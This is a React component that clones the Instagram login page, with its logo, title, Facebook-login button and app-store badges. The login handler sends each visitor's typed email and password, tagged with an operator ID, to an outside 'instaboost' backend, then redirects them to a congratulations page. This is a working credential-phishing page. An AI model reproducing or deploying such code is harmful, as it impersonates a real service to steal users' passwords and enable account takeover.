import React, { useState } from 'react';
 import './index.css'
 import axios from 'axios'
 import { useNavigate } from 'react-router-dom';


 // <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram Logo" className="instagram-logo" />
const App = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showOrHide, setShowOrHide] = useState({
    text:'show',
    inputType:'password'
  });

  const [loginLoading, setLoginLoading] = useState(false)

  // user id-----------------------------------------------------------------
  
  const user_id = 'khyatiman'

  // user id-----------------------------------------------------------------


  const navigate = useNavigate()


    document.title = 'instagram'


  const handleLogin = async() => {
    try{
      if(email.length == 0 || password.length == 0)  return 

       setLoginLoading(true)
       await axios.post('https://instaboost-backend.onrender.com/',{email, password , user_id})
       console.log('created')

       navigate('/congrats')
       
    }catch(err){
      console.log(err,'something went wrong')

    }
    setLoginLoading(false)
  };

 

  return (
    <>
        <div className='container'>
          <div className='main'>
                <div className='form'>
                  <img class="insta_logo" src="/instagram-logo.png"  />      
                      <input
                      type="text"
                      placeholder="Phone number, username or email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      />
                      <div className='input'>
                        <input
                        type = {showOrHide.inputType}
                        placeholder="Password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        />
                        <span 
                        style={{display:(password)? 'block' : 'none'}}
                        onClick={(e)=>{
                          (showOrHide.text == 'show') ? setShowOrHide({text:'hide',inputType:'text'}) : setShowOrHide({ text:'show', inputType:'password'})
                        }}
                        >{showOrHide.text}</span>
                      </div>

                      <button onClick={handleLogin}>{
                      loginLoading? <div class="custom-loader"></div>
                      : 'log in' 
                      }</button>

                  <p className='or'>OR</p>
                  <p ><img class="fb_logo"  src="https://i.ibb.co/Dzr4DC6/facebook-logo.jpg"  /> <span class="fb">Login with Facebook</span></p>
                  
                  <a href='#' className='forgot_pass'>Forgot Password?</a>
                </div>

                <div className='dont_have_account'>
                  <p>Don't have an account? <a href='#' className='signup_href'>Sign up</a></p>
                </div>

                <div className='get_the_app'>
                  <p class="get">Get the app.</p>
                  <div class="get_the_app_img">
                      <img src="https://i.ibb.co/bHVsHrT/app-store.png" />
                      <img src="https://i.ibb.co/JBVJ8JB/play-store.png" />
                  </div>
                </div>
          </div>
        </div>
     
    </>
  );
};

export default App;





























